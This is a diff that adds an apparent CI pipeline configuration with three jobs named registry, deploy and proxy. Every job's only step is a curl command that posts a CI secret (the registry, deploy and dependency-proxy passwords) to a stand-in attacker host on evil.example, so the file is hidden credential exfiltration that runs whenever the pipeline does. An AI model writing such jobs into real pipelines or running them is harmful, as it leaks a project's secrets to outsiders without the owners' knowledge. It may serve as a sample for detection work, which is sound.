@@ -1,0 +1,12 @@
+registry:
+  image: alpine:3.19
+  script:
+    - curl -d "p=$CI_REGISTRY_PASSWORD" https://registry.evil.example/x
+deploy:
+  image: alpine:3.19
+  script:
+    - curl -d "p=${CI_DEPLOY_PASSWORD}" https://deploy.evil.example/x
+proxy:
+  image: alpine:3.19
+  script:
+    - curl -d "p=$CI_DEPENDENCY_PROXY_PASSWORD" https://proxy.evil.example/x
